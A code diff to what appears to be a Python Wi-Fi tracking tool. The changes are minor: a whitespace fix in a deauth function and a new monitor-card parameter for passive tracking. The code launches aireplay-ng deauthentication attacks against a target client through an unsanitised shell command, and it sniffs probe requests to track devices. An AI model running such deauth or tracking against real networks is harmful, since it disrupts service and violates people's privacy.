@@ -47,7 +47,7 @@ def deauth(monitor_card, target, AP, duration='180'):
 
     # initiate deauth attack
     file = "active_track.pcap"
-    FNULL = open (os.devnull, 'w')
+    FNULL = open(os.devnull, 'w')
     subprocess.Popen("aireplay-ng --deauth 100 -a " + AP + " -c " +
                      target.lower() + " " + monitor_card.lower(),
                      shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
@@ -73,7 +73,7 @@ def deauth(monitor_card, target, AP, duration='180'):
 # return a updated new list of device in this time period
 # mode 0: only scan for Probe Request/Ass packs, mode 1: also scan for data packets and log new device
 def passive_tracking(signature_stats, ap_addr, duration="300", pck_file='tracking.pcap',
-                     db_file="signature_database.p", mode=0):
+                     monitor_card='wlan1mode', db_file="signature_database.p", mode=0):
     print("Perform passive tracking...")
     """os.system("timeout " + duration + " tcpdump -i " + monitor_card + " -s 0 -w " + pck_file + ' -v '
               + "type mgt and not subtype beacon")"""
